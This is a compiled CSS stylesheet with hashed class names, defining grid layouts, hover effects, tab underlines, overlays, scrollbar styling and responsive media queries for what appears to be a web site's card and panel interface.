    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt ._2BL5SDC9Zxvg7sCBwnf35P ._1xbtD8az_srq4J99zLex_e ._11SqjWi2NMl4Hscx-e5B8j button {
        display: flex
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt ._2BL5SDC9Zxvg7sCBwnf35P ._1xbtD8az_srq4J99zLex_e ._11SqjWi2NMl4Hscx-e5B8j button:hover {
        cursor: pointer
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt ._2BL5SDC9Zxvg7sCBwnf35P ._1xbtD8az_srq4J99zLex_e ._11SqjWi2NMl4Hscx-e5B8j .hjJYiPImVScNNpOQQb1Of path {
        fill: var(--ah-red-100)
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._2ZQlt7U3-R94GBHsX4_mC5 {
        display: grid;
        grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
        column-gap: 10px;
        overflow: hidden
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 {
        display: flex !important;
        align-items: center;
        padding: 6px
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 * {
        cursor: pointer;
        user-select: none
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9:hover {
        background-color: var(--ah-grey-700);
        border-radius: 4px
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._3UF47UW0si9g7XwSUP1iVT {
        margin-right: 6px
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._3UF47UW0si9g7XwSUP1iVT img {
        height: 70px;
        width: 70px;
        border-radius: 4px
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb {
        width: 100%;
        display: grid;
        grid-template-rows: auto;
        row-gap: 6px
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb ._2nyzWseCKG5Y9NKwCzXiMv {
        display: grid;
        grid-template-columns: auto 1fr;
        gap: 4px
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb ._2nyzWseCKG5Y9NKwCzXiMv ._22-TaePJ6z4_ASdqT2YMTm {
        color: var(--ah-yellow-300);
        font-weight: bold
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb ._2t337X9_Ma3qqINFJvHGtu div {
        display: inline-block
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb ._2t337X9_Ma3qqINFJvHGtu ._19UFNAFJ0gN1db0r86AkxW {
        font-weight: bold;
        margin-left: 4px;
        color: var(--ah-green-100)
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb ._2dDhzS1iTXaFrjvZBtEawa {
        display: grid;
        grid-template-columns: 1fr auto
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb ._2dDhzS1iTXaFrjvZBtEawa div {
        display: flex;
        align-items: center;
        gap: 2px
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb ._2dDhzS1iTXaFrjvZBtEawa div div {
        color: var(--ah-grey-100)
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._14VxUs2JqJAkOaQaxygxW9 ._28BvV8r2c8n3XIGERlIEEb ._2OENfrT0LaQ4TM2mcLdsy0 {
        color: var(--ah-grey-100);
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX .PLSTYChiBBlaCMhbNoJrL {
        display: flex;
        color: var(--ah-grey-100)
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._1ds21L1o6xB9h2pw-hNDtl {
        font-size: 12px;
        line-height: 16px;
        color: #6d6d6d;
        display: flex;
        align-items: center;
        gap: 4px;
        margin-top: 8px;
        font-style: italic
    }

    @media (max-width: 1500px) {
        ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._14VxUs2JqJAkOaQaxygxW9 {
            padding: 3px !important
        }

        ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._28BvV8r2c8n3XIGERlIEEb {
            row-gap: 2px !important
        }

        ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._3UF47UW0si9g7XwSUP1iVT img {
            width: 48px !important;
            height: 48px !important
        }

        ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX .PLSTYChiBBlaCMhbNoJrL,
        ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._3OGWlxwvhmcO5QtcMysPfa {
            font-size: 11px
        }

        ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._1ds21L1o6xB9h2pw-hNDtl {
            font-size: 11px
        }
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c {
        padding: 16px 0
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._2A-j8P8mpRPjRLgiCg5MKg {
        user-select: none;
        cursor: pointer;
        width: 267px;
        text-overflow: ellipsis;
        overflow: hidden
    }

    @media (max-width: 1500px) {
        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._2A-j8P8mpRPjRLgiCg5MKg {
            width: 216px;
            margin-top: -20px
        }

        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._2A-j8P8mpRPjRLgiCg5MKg img {
            width: 48px !important;
            height: 48px !important
        }
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._136Fu9qY5EHO1gNdjHEEl {
        max-width: 1200px;
        min-height: 100px;
        margin: auto
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._131gB88nfzsFfl-qXd0VQ3 {
        display: flex;
        justify-content: flex-start;
        gap: 12px;
        min-width: 150px;
        padding: 0 12px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._131gB88nfzsFfl-qXd0VQ3 ._35umIaZ8sMjsjPWVsPb7S7 {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 30px;
        transition: 0s;
        border-radius: 20px;
        min-width: 50px;
        padding: 0 16px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh {
        background-color: #fff;
        border-radius: 4px;
        border: 1px solid var(--ah-red-100);
        padding: 12px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 12px;
        padding-bottom: 10px;
        border-bottom: 1px solid var(--ah-grey-700);
        width: 100%
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG ._24_nKTrBESLGLhAkeyyxLc {
        margin-left: 8px;
        font-weight: bold;
        color: var(--ah-grey-100)
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG ._3WwKL6LLYcXra8_vvuxIij {
        display: flex;
        align-items: center
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG ._5swr36YB4PFDKJZUHyj9k ._1d9ZjTO3m1vPoYG6F83L9A {
        display: flex;
        align-items: center;
        justify-content: space-between;
        user-select: none
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG ._5swr36YB4PFDKJZUHyj9k ._1d9ZjTO3m1vPoYG6F83L9A a {
        cursor: pointer;
        color: var(--ah-blue-100)
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG ._5swr36YB4PFDKJZUHyj9k ._1d9ZjTO3m1vPoYG6F83L9A ._3iDVdcLUzNrQVDHGHSh59J {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-right: 12px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG ._5swr36YB4PFDKJZUHyj9k ._1d9ZjTO3m1vPoYG6F83L9A ._3iDVdcLUzNrQVDHGHSh59J button {
        display: flex
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG ._5swr36YB4PFDKJZUHyj9k ._1d9ZjTO3m1vPoYG6F83L9A ._3iDVdcLUzNrQVDHGHSh59J button:hover {
        cursor: pointer
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .e372Ax8eSbAc3YJhxP3XG ._5swr36YB4PFDKJZUHyj9k ._1d9ZjTO3m1vPoYG6F83L9A ._3iDVdcLUzNrQVDHGHSh59J ._1IhT3WMWu-oJEeEHZSu2Ea path {
        fill: var(--ah-red-100)
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3gxGvM9K_zYegZOsBjF6GQ ._2chXZklW5wDQ5wcjMzWV7b {
        display: grid;
        grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
        column-gap: 10px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3gxGvM9K_zYegZOsBjF6GQ ._2oyFjwm8pcV7hUeCKTgWxc {
        height: 16px !important;
        width: 16px !important
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S {
        display: flex !important;
        align-items: center;
        padding: 6px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S * {
        cursor: pointer;
        user-select: none
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S:hover {
        background-color: var(--ah-grey-700);
        border-radius: 4px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._3LFvdHeSKCG56-XpJEeiDR {
        margin-right: 6px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._3LFvdHeSKCG56-XpJEeiDR img {
        height: 85px;
        width: 85px;
        border-radius: 4px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC {
        width: 100%;
        display: grid;
        grid-template-rows: auto;
        row-gap: 3px;
        position: relative
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC ._3HXki1aEyL321CeD6oHKH_ {
        display: grid;
        grid-template-columns: auto 1fr;
        gap: 4px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC ._3HXki1aEyL321CeD6oHKH_ ._3rZP-ovjqPhT2lEcpG6vkz {
        color: var(--ah-yellow-300);
        font-weight: bold
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC ._3HXki1aEyL321CeD6oHKH_ ._3Wk8pBxRVpZjru5Mxyo-nA {
        color: var(--ah-yellow-300);
        font-weight: bold;
        position: absolute;
        top: -16px;
        left: 0
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC .-jgoi8PF55GMhCe_A9D67 div {
        display: inline-block
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC .-jgoi8PF55GMhCe_A9D67 .uB-l_izWbQuZj257Rjzjq {
        font-weight: bold;
        margin-left: 4px;
        color: var(--ah-green-100)
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC ._1JEUp4Qryva8oqo_GPEyws {
        display: grid;
        grid-template-columns: 1fr auto
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC ._1JEUp4Qryva8oqo_GPEyws div {
        display: flex;
        align-items: center;
        gap: 2px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC ._1JEUp4Qryva8oqo_GPEyws div div {
        color: var(--ah-grey-100)
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh ._3K-iyKJw4kKyx7hFT0u41S ._6wjcnhRM1cr0ViOJQb1HC .IBCMaFLU4yP8J4ACusWE8 {
        color: var(--ah-grey-100);
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3AG9avADJEZp3-TUNTu0xh .N8OblXnFkWMGfVUkLacSg {
        display: flex;
        gap: 3px;
        padding: 6px 0 0 6px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._2oQRVy6dNMaG1_WRGtJ9RQ {
        display: flex;
        color: var(--ah-grey-100)
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._23YbnHM-qN6r-hllFiMja9 {
        display: flex;
        justify-content: center;
        align-items: center;
        position: relative;
        gap: 12px;
        height: 108px
    }

    ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._23YbnHM-qN6r-hllFiMja9 .KIjB4Aq7gn6Ew_HMtFi9v {
        height: 85px;
        width: 110px
    }

    @media (max-width: 1500px) {
        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3K-iyKJw4kKyx7hFT0u41S {
            padding: 3px !important
        }

        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._6wjcnhRM1cr0ViOJQb1HC {
            row-gap: 2px !important
        }

        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3LFvdHeSKCG56-XpJEeiDR img {
            width: 48px !important;
            height: 48px !important
        }

        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._2oQRVy6dNMaG1_WRGtJ9RQ,
        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._3RQ-uV9eFf4v9jqFw7AnPE {
            font-size: 11px
        }

        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._23YbnHM-qN6r-hllFiMja9 {
            height: 87px
        }

        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._23YbnHM-qN6r-hllFiMja9 .KIjB4Aq7gn6Ew_HMtFi9v {
            height: 70px;
            width: 90px
        }
    }

    @media (max-width: 1230px) {
        ._1gfmMNvm2WMa1Fft6JIndN._2ESS5abi8ecMtxWPhuM7_c ._136Fu9qY5EHO1gNdjHEEl {
            max-width: 960px
        }
    }

    ._38aHqFDEbqkPV6OeD0_Lrf {
        opacity: 0 !important
    }

    ._3b1yRYMYGRJWfMp5c4aWye {
        opacity: 1 !important;
        transition: opacity 0.5s !important
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 {
        min-height: 460px;
        width: 100%
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 ._3vPtNuWZBaObuK24eQLGoC {
        position: sticky;
        top: 0;
        z-index: 1009;
        background-color: #fff
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 ._1RD4vmyTZo54QAjMhfvfTT {
        padding: 0 20px;
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between;
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08)
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 ._1RD4vmyTZo54QAjMhfvfTT ._2cDQiea_teCXENKy7EqX-u {
        display: inline-flex;
        align-items: center
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 ._1RD4vmyTZo54QAjMhfvfTT ._2cDQiea_teCXENKy7EqX-u ._2iUcMtutb1WqZx7j0Y4wtJ {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 ._1RD4vmyTZo54QAjMhfvfTT:after {
        content: '';
        display: block;
        width: 100%;
        position: absolute;
        bottom: 0;
        left: 0px
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a {
        display: flex;
        align-items: center;
        border-bottom: solid 1px var(--ah-grey-700);
        margin: 10px 20px 0;
        padding: 0 0px;
        min-height: 44px
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._2UIhptARQBycPquzYC4v07 {
        padding: 14px 8px;
        line-height: 16px;
        cursor: pointer;
        user-select: none;
        position: relative;
        color: #242830;
        font-size: 14px;
        margin-right: 20px;
        font-weight: 600;
        text-transform: uppercase
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._2UIhptARQBycPquzYC4v07 * {
        cursor: pointer;
        user-select: none
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._2UIhptARQBycPquzYC4v07:before,
    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._2UIhptARQBycPquzYC4v07:after {
        content: '';
        position: absolute;
        bottom: -1px;
        height: 3px;
        background-color: transparent;
        transition: 0.15s;
        width: 0;
        border-radius: 4px
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._2UIhptARQBycPquzYC4v07:before {
        right: 49%
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._2UIhptARQBycPquzYC4v07:after {
        left: 49%
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._2UIhptARQBycPquzYC4v07:hover {
        color: var(--ah-red-100)
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._2UIhptARQBycPquzYC4v07:active {
        color: var(--ah-red-100)
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._12yEcCCmJqyu3w8l_HxIzS {
        color: var(--ah-red-100);
        font-weight: 600
    }

    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._12yEcCCmJqyu3w8l_HxIzS:before,
    ._2zWtxTZ-OC-7ymWKErzPh1.vxIcmsFslkEA7LhH6eNN5 .Rm4qEfmP_g2oCtl0vxU5a ._12yEcCCmJqyu3w8l_HxIzS:after {
        width: 50%;
        background-color: var(--ah-red-100)
    }

    ._2iPbGzd2FB4dtJMcmA7RAO ._1eTleiZFVeZcnFI7HFLfBF {
        background-color: var(--ah-white);
        padding-top: 10px;
        border-bottom: none;
        border-radius: 8px;
        background-color: #fff;
        box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.08)
    }

    ._2iPbGzd2FB4dtJMcmA7RAO ._3yGFJ2-fyPCQ0URFIAC5JI {
        overflow-y: auto;
        max-height: calc(100vh - 30px - var(--ah-height-nav));
        min-height: 250px;
        height: 100%
    }

    ._2iPbGzd2FB4dtJMcmA7RAO ::-webkit-scrollbar {
        width: 4px;
        border-radius: 30px
    }

    ._2iPbGzd2FB4dtJMcmA7RAO ::-webkit-scrollbar-track {
        background: transparent
    }

    ._2iPbGzd2FB4dtJMcmA7RAO ::-webkit-scrollbar-thumb {
        background: #dadada;
        border-radius: 30px
    }

    ._2iPbGzd2FB4dtJMcmA7RAO ::-webkit-scrollbar-thumb:hover {
        background: #999
    }

    ._30j51DR3PziqkqDAbKC8II ._1-cIBVR_MK-PzKiDd4H1Zk {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: -30px;
        border-radius: 0 0 6px 6px;
        overflow: hidden;
        z-index: 999
    }

    .kKpFVZCimXFVHwV0AApvU ._2cr-LDF-CUn12ebKfLiRx2 {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: -30px;
        border-radius: 0 0 6px 6px;
        overflow: hidden;
        z-index: 999
    }

    ._2skNyWe29gpXKInka9fntF {
        position: relative !important
    }

    ._2skNyWe29gpXKInka9fntF ._3eMrseCF8MGdPPQ0vkRFYc {
        position: relative;
        padding: 8px 0 0
    }

    ._2skNyWe29gpXKInka9fntF ._3eMrseCF8MGdPPQ0vkRFYc._16AI-WslIqoeX-ubiyWRKo {
        z-index: -1
    }

    ._2skNyWe29gpXKInka9fntF ._1VpoSh_ogvsfuz6NN0PIBq {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2skNyWe29gpXKInka9fntF ._1-45Q5f7cSDIT81CZpkemp {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: -1;
        opacity: 0;
        visibility: hidden;
        background-color: #d2d2d2
    }

    ._2skNyWe29gpXKInka9fntF ._1-45Q5f7cSDIT81CZpkemp._16AI-WslIqoeX-ubiyWRKo {
        opacity: 1;
        visibility: visible;
        z-index: 1
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._3CvZ_GoCMh6QPKmvBiW74Q {
        background: rgba(255, 255, 255, 0.75);
        box-shadow: 0px 0px 8px rgba(0, 0, 0, 0.08);
        border-radius: 4px;
        padding: 24px 26px;
        min-height: 540px;
        height: 100%
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._1n9z_y0f4R8hcKHUv8k8WH {
        display: flex;
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 999;
        background: rgba(65, 65, 65, 0.95);
        border-radius: 4px;
        color: #fff;
        justify-content: flex-end;
        flex-direction: column;
        padding: 28px
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._1n9z_y0f4R8hcKHUv8k8WH ._3DWrSzgTGDHjILiNg5qg0- {
        font-weight: 600;
        font-size: 1.25rem;
        color: #fff
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._1n9z_y0f4R8hcKHUv8k8WH ._31CH5DL9_w65KQ0vZpCGlK {
        margin-top: 1rem;
        color: #fff
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._3rkq_AoClAeh717A_Xjglx {
        border-radius: 8px;
        width: 100%;
        min-height: 330px;
        overflow: hidden
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._3uswWzl4D9P7nstOyyAjtv {
        position: relative;
        padding: 8px 0 0
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._3P0Vjvvhp6nBnMH-LGr16P {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._1u5dNazy18xpGgzRu4zqAC {
        display: flex !important;
        align-items: center
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._1u5dNazy18xpGgzRu4zqAC .UPsZMgRGxyGawr5vLykx7 {
        font-weight: 600;
        font-size: 18px;
        line-height: 27px;
        color: #2e2e2e
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._1u5dNazy18xpGgzRu4zqAC ._9L9HEamjSASU6dgRiikbX {
        margin-left: auto;
        font-weight: 600;
        font-size: 12px;
        line-height: 28px;
        color: #2e2e2e
    }

